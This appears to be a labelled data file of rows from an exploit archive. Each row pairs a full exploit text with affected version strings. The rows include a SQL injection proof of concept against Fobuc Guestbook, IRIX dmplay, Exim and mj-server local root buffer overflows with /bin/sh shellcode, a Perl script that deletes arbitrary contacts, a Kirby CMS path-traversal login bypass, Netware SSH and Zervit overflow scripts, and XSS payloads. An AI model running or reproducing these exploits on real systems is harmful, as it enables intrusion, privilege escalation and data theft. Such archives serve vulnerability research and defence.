26132,"Fobuc Guestbook 0.9 - SQL Injection # Exploit Title   : Fobuc Guestbook 0.9 SQL Injection # Date            : 11 June 2013 # Exploit Author  : CWH Underground # Site            : www.2600.in.th # Vendor Homepage : http://sourceforge.net/projects/fobuc/ # Software Link   : http://jaist.dl.sourceforge.net/project/fobuc/0.9/Release/FOBUC_0.9.zip # Version         : 0.9 # Tested on       : Window and Linux      ,--^----------,--------,-----,-------^--,   | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..   `+---------------------------^----------|     `\_,-------, _________________________|       / XXXXXX /`|     /      / XXXXXX /  `\   /     / XXXXXX /\______(    / XXXXXX /           / XXXXXX /  (________(             `------'    ############################## VULNERABILITY: SQL Injection  ##############################    /index.php (LINE: 146-155)    ----------------------------------------------------------------------------- LINE 146-149:   $category_filter = $_GET['category']; $query = ""SELECT * FROM comments WHERE approved = 1 AND category = '$category_filter' AND responding = 0 ORDER BY id LIMIT $start, $displayed_entries""; $filter = 'category'; $total_query = ""SELECT * FROM comments WHERE approved = 1 AND category = '$category_filter' AND responding = 0""; -----------------------------------------------------------------------------   ----------------------------------------------------------------------------- LINE 155:   $total_comments = mysql_num_rows(mysql_query($total_query)); -----------------------------------------------------------------------------           ##################################################### DESCRIPTION FOR SQL INJECTION #####################################################    An attacker might execute arbitrary SQL commands on the database server with this vulnerability. User tainted data is used when creating the database query that will be executed on the database management system (DBMS). An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system depending on the query, DBMS and configuration.   POC:   http://target/fobuc/index.php?category=1%27%20and%201%20div%200%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29,3,4,5,6,7,8,9,10--+       ################################################################################################################  Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 ################################################################################################################",['0.9'],1
20128,"IRIX 6.5.x - '/usr/sbin/dmplay' Local Buffer Overflow /* source: https://www.securityfocus.com/bid/1528/info  Certain versions of IRIX ship with a version of dmplay which is vulnerable to a buffer overflow attack. The program, dmplay, is used to play movie files under IRIX. The problem at hand is the way the program handles the DISPLAY variable for the users X terminal. It does not check bounds and therefore is vulnerable to attack by an overly long user supplied string.  */  /*## copyright LAST STAGE OF DELIRIUM oct 1997 poland        *://lsd-pl.net/ #*/ /*## /usr/sbin/dmplay                                                        #*/  #define NOPNUM 800 #define ADRNUM 156 #define PCHNUM 148 #define TMPNUM 52  char shellcode[]=     ""\x04\x10\xff\xff""    /* bltzal  $zero,<shellcode>    */     ""\x24\x02\x03\xf3""    /* li      $v0,1011             */     ""\x23\xff\x01\x14""    /* addi    $ra,$ra,276          */     ""\x23\xe4\xff\x08""    /* addi    $a0,$ra,-248         */     ""\x23\xe5\xff\x10""    /* addi    $a1,$ra,-240         */     ""\xaf\xe4\xff\x10""    /* sw      $a0,-240($ra)        */     ""\xaf\xe0\xff\x14""    /* sw      $zero,-236($ra)      */     ""\xa3\xe0\xff\x0f""    /* sb      $zero,-241($ra)      */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""/bin/sh"" ;  char jump[]=     ""\x03\xa0\x10\x25""    /* move    $v0,$sp              */     ""\x03\xe0\x00\x08""    /* jr      $ra                  */ ;  char nop[]=""\x24\x0f\x12\x34"";  main(int argc,char **argv){     char buffer[10000],adr[4],pch[4],tmp[4],*b,*envp[2],display[128];     int i;      printf(""copyright LAST STAGE OF DELIRIUM oct 1997 poland  //lsd-pl.net/\n"");     printf(""/usr/sbin/dmplay for irix 6.2 6.3 IP:17,19,20,21,22,32\n\n"");      if(argc!=3){         printf(""usage: %s {62|63} xserver:display\n"",argv[0]);         exit(-1);     }      if(!strcmp(argv[1],""62"")){         *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10396+32;         *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10396+32+900+30540;         *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10396+32+8000;     }     if(!strcmp(argv[1],""63"")){         *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10348+32;         *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10348+32+900-84;         *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10348+32+8000;     }      sprintf(display,""DISPLAY=%s"",argv[2]);     envp[0]=display;     envp[1]=0;      b=buffer;     for(i=0;i<NOPNUM;i++) *b++=nop[i%4];     for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];     *b++=0xff;     for(i=0;i<ADRNUM;i++) *b++=adr[i%4];     for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];     for(i=0;i<PCHNUM;i++) *b++=pch[i%4];     *b=0;      execle(""/usr/sbin/dmplay"",""lsd"",buffer,0,envp); }",['6.5.x'],1
5769,"Telephone Directory 2008 - Arbitrary Delete Contact #!/usr/bin/perl -w # Telephone Directory 2008 <=  Arbitrary Delete Contact ######################################## #[*] Founded &  Exploited by : Stack #[*] Contact: Ev!L =>> see down #[*] Greetz : Houssamix & Djekmani & Jadi &  iuoisn & hak3r-b0y All muslims HaCkeRs  :) #[*]  Special Thnx To : Simo64  L3azzzzzz khouya ######################################## #----------------------------------------------------------------------------# ######################################## # * TITLE:          PerlSploit Class # * REQUIREMENTS:   PHP 4 / PHP 5 # * VERSION:        v.1 # * LICENSE:        GNU General Public License # * ORIGINAL URL:   http://www.v4-Team/v4.txt # * FILENAME:       PerlSploitClass.pl # * # * CONTACT:        Wanted  (french / english / arabic / moroco Darija :d ) # * THNX : AllaH # * GREETZ:         Houssamix & Djekmani ######################################## #----------------------------------------------------------------------------# ######################################## system(""color f""); print ""\t\t############################################################\n\n""; print ""\t\t#   Telephone Directory 2008 <=  Arbitrary Delete Contact  #\n\n""; print ""\t\t#                          by Stack                        #\n\n""; print ""\t\t############################################################\n\n""; ######################################## #----------------------------------------------------------------------------# ######################################## use LWP::UserAgent; die ""Example: perl $0 http://victim.com/path/\n"" unless @ARGV; print ""\n[!] ContactID : ""; chomp(my $id=<STDIN>); $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'); $host = $ARGV[0] . ""/del_query1.php?id="".$id.""""; $res = $b->request(HTTP::Request->new(GET=>$host)); $answer = $res->content; if ($answer =~ /Contact(.*?)<br>/){         print ""\nBrought to you by v4-team.com...\n"";         print ""\n[+] Contact$1\n"";}   else{print ""\n[-] Exploit Failed...\n"";}    ######################################## #-------------------         Exploit exploited by Stack       --------------------# ########################################  # milw0rm.com [2008-06-09]",['2008'],1
20333,"Exim Buffer 1.6.2/1.6.51 - Local Overflow /* source: https://www.securityfocus.com/bid/1859/info  A potential local root yielding buffer overflow vulnerability exists in Exim mail client version 1.62.   A buffer used in processing filenames of message attachments can be overflowed by a maliciously-formed filename. As a result, the excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address. Since this data is supplied by the user it can be a crafted so that alter the program's flow of execution. If properly exploited, this can yield root privilege to the attacker. */  /* sample code for one OS/compiler combination; ./this ./exim -bt you */  char code[] = { 0x31,0xc0 /* eax = 0 */ , 0x50 /* push eax */ , 0xbb,0x98,0x30,0x04,0x00 /* ebx = 0x43098; &seteuid in my copy of exim */ , 0xff,0xd3 /* call ebx */ , 0x31,0xc0 , 0x50 , 0xb8,0x9a,0xd1,0x03,0x00 /* eax = 0x3d19a; &""/bin/sh"" in my copy of exim */ , 0x50 , 0x50 , 0xbb,0xf8,0x29,0x04,0x00 /* ebx = 0x429f8; &execl in my copy of exim */ , 0xff,0xd3 , 0x00 /* just to terminate the last string in the environment */ } ;  char buf[1000]; char *env[1001];  void main(argc,argv) int argc; char **argv; { int i; int j;  for (i = 0;i < sizeof buf;++i) buf[i] = 0x90; /* nop */ memcpy(buf + sizeof buf - sizeof code,code,sizeof code);  j = 0; env[0] = buf; for (i = 0;i < sizeof buf;++i) if (!buf[i]) env[++j] = buf + i + 1; env[j] = 0;  if (argv[1]) execve(argv[1],argv + 1,env); exit(1); }","['1.6.2/1.6.51', '1.62']",1
38255,"Kirby CMS 2.1.0 - Authentication Bypass ============================================= - Release date: 14.09.2015 - Discovered by: Dawid Golunski - Severity: Medium/High =============================================    I. VULNERABILITY -------------------------  Kirby CMS <= 2.1.0     Authentication Bypass via Path Traversal    II. BACKGROUND -------------------------  - Kirby CMS  ""Kirby is a file‑based CMS Easy to setup. Easy to use. Flexible as hell.""  http://getkirby.com/    III. INTRODUCTION -------------------------  KirbyCMS has a vulnerability that allows to bypass authentication in a hosting environment where users within the same shared environment can save/read files in a directory accessible by both the victim and the attacker.   IV. DESCRIPTION -------------------------   As KirbyCMS is a file based CMS, it also stores authentication data within files in accounts directory, each user has its own password file such as: kirby/site/accounts/[username].php At login, KirbyCMS refer to the password file to verify the passwor hash.  During the process, it fails to validate the resulting path to ensure that it does not contain path traversal sequences such as '../' within the login variable provided by a user.   This makes it vulnerable to a path traversal attack and allows to bypass  the authentication if an attacker is located in the same multi-user hosting  environment and can write files to a public directory such as /tmp accessible  by the victim site with KirbyCMS.  The exact code responsible for this vulnerability is located in  kirby/core/user.php file and is shown below:  ---[ kirby/core/user.php ]---  abstract class UserAbstract {    protected $username = null;   protected $cache = array();   protected $data = null;    public function __construct($username) {      $this->username = str::lower($username);      // check if the account file exists     if(!file_exists($this->file())) {       throw new Exception('The user account could not be found');     }         ...   }    protected function file() {     return kirby::instance()->roots()->accounts() . DS . $this->username() . '.php';   }  -----------------------------   In addition to the authentication bypass KirbyCMS was found to allow authentication over HTTP protocol (resulting in passwords being sent  unencrypted), and to never expire authenticated sessions.   V. PROOF OF CONCEPT -------------------------  KirbyCMS stores credentials in: kirby/site/accounts directory as PHP files to prevent the contents from being accessed directly via the web server.   An example file with credentials looks as follows:  ---[ victimuser.php ]---  <?php if(!defined('KIRBY')) exit ?>  username: victim email: victim@mailserver.com password: >   $2a$10$B3DQ5e40XQOSUDSrA4AnxeolXJNDBb5KBNfkOCKlAjznvDU7IuqpC language: en role: admin  ------------------------  To bypass the authentication an attacker who has an account in the same hosting environment as the victim can write the above credentials file  containing an encrypted hash of the password: trythisout into a public directory such as:  /tmp/bypassauth.php  Because of the aformentioned Path Traversal vulnerability the attacker can use such credentials and log in as an administrator  (via: http://victim-server.com/kirby/panel/login) with:  Username: ../../../../../../../../tmp/bypassauth Password: trythisout  which will produce a HTTP POST request similar to:  POST /kirby/panel/login HTTP/1.1 Host: victim_kirby_site Cookie: PHPSESSID=mqhncr49bpbgnt9kqrp055v7r6; kirby=58eddb6... Content-Length: 149  username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fbypassauth&password=trythisout&_csfr=erQ1UvOm2L1...   This will cause KirbyCMS to load credentials from the path:  /sites/victim/kirby/site/accounts/../../../../../../../../tmp/bypassauth.php   As a result, the attacker will get the following response:  <h2 class=""hgroup hgroup-single-line cf""> <span class=""hgroup-title"">   <a href=""#/users/edit/../../../../../../../../tmp/bypassauth"">Your account</a> </span> <span class=""hgroup-options shiv shiv-dark shiv-left"">  getting access to the KirbyCMS control panel with admin rights.   VI. BUSINESS IMPACT -------------------------  Users who make use of vulnerable versions of KirbyCMS in shared hosting environments are at risk of having their website modified by unauthorized users. An attacker who manages to log in as an administrator will be able to change all the existing content as well as upload new files.  This attack could be combined with the: 'CSRF Content Upload and PHP Script  Execution' vulnerability, also discovered by Dawid Golunski and described in a  separate document.   VII. SYSTEMS AFFECTED -------------------------  The latest version of KirbyCMS (2.1.0) was confirmed to be exploitable.  To exploit the vulnerability an attacker must be able to write a malicious credentials file on the system in a public directory that is accessible by the victim KirbyCMS site. This is a common situation on many hosting environments that allow to write/read files from temporary directories such as /tmp,  /var/tmp etc.  Such file could potentially also be uploaded by other means, even if the attacker does not have an account on the same server, such as anonymous FTP , an email attachment which gets saved in a tmp file on the server etc.    VIII. SOLUTION -------------------------  Upgrade to the patched version 2.1.1 released by the vendor upon this advisory.   IX. REFERENCES -------------------------  http://legalhackers.com  http://legalhackers.com/advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.txt  http://getkirby.com/  http://seclists.org/fulldisclosure/2015/Sep/index.html http://www.securiteam.com/   X. CREDITS -------------------------  The vulnerability has been discovered by Dawid Golunski dawid (at) legalhackers (dot) com legalhackers.com   XI. REVISION HISTORY -------------------------  14.09.2015 - Final   XII. LEGAL NOTICES -------------------------  The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. I accept no responsibility for any damage caused by the use or misuse of this information.",['2.1.0'],1
14866,"Novell Netware 6.5 - OpenSSH Remote Stack Overflow #####################################################################################  Application:   Novell Netware OpenSSH Remote Stack Overflow  Platforms:  Netware 6.5  Exploitation:   Remote code execution  CVE Number:  Novell TID:   7006756  ZeroDayInitiative: ZDI-10-169  Author:   Francis Provencher (Protek Research Lab's)  Blog:   http://www.protekresearchlab.com/   #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) The Code   #####################################################################################  =============== 1) Introduction ===============  Novell, Inc. is a global software and services company based in Waltham, Massachusetts. The company specializes in enterprise operating systems, such as SUSE  Linux Enterprise and Novell NetWare; identity, security, and systems management solutions; and collaboration solutions, such as Novell Groupwise and Novell  Pulse.  Novell was instrumental in making the Utah Valley a focus for technology and software development. Novell technology contributed to the emergence of local  area networks, which displaced the dominant mainframe computing model and changed computing worldwide. Today, a primary focus of the company is on developing  open source software for enterprise clients.  (http://en.wikipedia.org/wiki/Novell)  #####################################################################################  ============================ 2) Report Timeline ============================  2010-04-06 The details of this case have been submitted to the vendor as ZDI-CAN-674. 2010-09-01 Vendor respond with an advisory without nothing to fix the vulnerability.   #####################################################################################  ============================ 3) Technical details ============================  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Novell Netware. Authentication is required to exploit  this vulnerability.  The flaw exists within SSHD.NLM. When the application attempts to resolve an absolute path on the server, a 512 byte destination buffer is used without  bounds checking. By providing a large enough value, an attacker can cause a buffer to be overflowed. Successful exploitation results in remote code execution  under the context of the server.  #####################################################################################  =========== 4) The Code ===========   #!/usr/bin/perl  use Net::SSH2; use Getopt::Std;  @overflow = ('A' x 1034);  getopts('H:P:u:p:', \%opts); $host = $opts{'H'}; $port = $opts{'P'}; $username = $opts{'u'}; $password = $opts{'p'};  if(!defined($host) || !defined($username)) {      print ""\nUsage: $0 -H <host> -P [port] -u <username> -p [password]\n\n"";      exit(0);  }   print ""\SCP Get... Beep, Beep""; foreach(@overflow) { $ssh2 = Net::SSH2->new(); $ssh2->connect($host, $port)               || die ""\nError: Connection Refused!\n""; open(FD, '>>sshfuzz.log'); print FD $host . ""\n"" . $_ . ""\n\n""; $ssh2->auth_password($username, $password) || die ""\nError: Username/Password Denied!\n""; $fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); } sleep(1);   close(FD); close(FDD); close(FDDD); close(FDDDD);  exit;      ##################################################################################### (PRL-2010-07)",['6.5'],1
23197,"Mah-Jong 1.4 - MJ-Player Server Flag Local Buffer Overflow // source: https://www.securityfocus.com/bid/8729/info  A problem in the handling of large requests supplied with certain flags has been reported in Maj-Jong. Because of this, it may be possible for a local attacker to gain elevated privileges.  /* *   mj-server(client) local root(possible in debian)  exploit *   test in (redhat7.2----redhat8.0) *   coded by jsk * *  (c) Ph4nt0m Security Team  /www.ph4nt0m.org * */ #include <stdio.h> #include <stdlib.h> #include <unistd.h> #define BUFSIZE 150   char shellcode[] = ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x31xc0x31xdbxb0x17xcdx80xebx1fx5ex89x76x08x31"" ""xc0x88x46x07x89x46x0cxb0x0bx89xf3x8dx4ex08x8d"" ""x56x0cxcdx80x31xdbx89xd8x40xcdx80xe8xdcxffxff"" ""xffx2fx62x69x6ex2fx73x68x58""; void banner (void);  void banner (void) { fprintf (stdout, ""\n [+] mj-server local  exploit mail:<jsk@ph4nt0m.net>""); fprintf (stdout, ""\n [+] by jsk < <a href=""http://www.ph4nt0m.org"" target=""_blank""><a href=""http://www.ph4nt0m.org"" target=""_blank"">www.ph4nt0m.org</a></a>> talk with me <irc.0x557.org #ph4nt0m> ""); fprintf (stdout, ""\n [+] spawning shell \n\n""); }  int main(void) {     char buf[BUFSIZE+16];     char *prog[] = {""/home/mj-1.4-src/mj-server"",""--server"", buf, NULL};     char *env[] = {""HOME=jsk"", shellcode, NULL};     unsigned long ret = 0xc0000000 - sizeof(void *) - strlen(prog[0]) -     strlen(shellcode) - 0x02;     memset(buf,0x41,sizeof(buf));     memcpy(buf+BUFSIZE,(char *)&ret,4);     memcpy(buf+BUFSIZE+4,(char *)&ret,4);     memcpy(buf+BUFSIZE+8,(char *)&ret,4);     buf[BUFSIZE+12] = 0x00;     printf(""\n [+] Using address: 0x%x"", ret);     banner ();     execve(prog[0],prog,env);     return 0; }",['1.4'],1
8721,"Zervit Web Server 0.04 - GET Remote Buffer Overflow (PoC) #!/usr/bin/perl # Zervit webserver 0.4 Bof Poc # make it just for fun :s use LWP::Simple; use LWP::UserAgent;   if (@ARGV < 2) {             print(""Usage: $0 <url> <port>\n"");             print(""TARGETS are\n "");             print(""Example: perl $0 127.0.0.1 777 \n"");             exit(1);                     }                     ($target, $port) = @ARGV;         print(""Zervit Webserver 0.04 bof xpl : Coded by Stack!\n"");         print(""Attacking $target on port $port!\n"");         print(""Ddossing .......\n"");         $dos =""\x41"" x 1000 ;         $temp=""/"" x 2;          my $url= ""http://"". $target. "":"" . $port .$temp . $dos;             $content=get $url;             print(""\n Server Bofed"");  # milw0rm.com [2009-05-18]",['0.04'],1
19531,"Cisco IOS 12.0.2 - Syslog Crash source: https://www.securityfocus.com/bid/675/info  Cisco devices running classic IOS are reported prone to a denial of service vulnerability. The issue occurs when a vulnerable device receives and processes a UDP packet on UDP port 514 for syslog. This issue results in a crash or hang requiring a reboot.  Vulnerable IOS software may be found on the following Cisco devices:  - Cisco routers in the AGS/MGS/CGS/AGS+, IGS, RSM, 8xx, ubr9xx, 1xxx, 25xx, 26xx, 30xx, 36xx, 38xx, 40xx, 45xx, 47xx, AS52xx, AS53xx, AS58xx, 64xx, 70xx, 72xx (including the ubr72xx), 75xx, and 12xxx series. -Recent versions of LS1010 ATM switch. -Catalyst 2900XL LAN switch. -Cisco DitributedDirector.   nmap -sU -p514 <IP-of-Cisco-device>",['12.0.2'],1
36447,"Pulse Pro 1.7.2 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/51056/info  Pulse Pro is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Pulse Pro 1.7.2 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?p=blocks&d=""><script>alert(1)</script> http://www.example.com/index.php?p=edit-post&post_id=""><script>alert(1)</script>",['1.7.2'],1
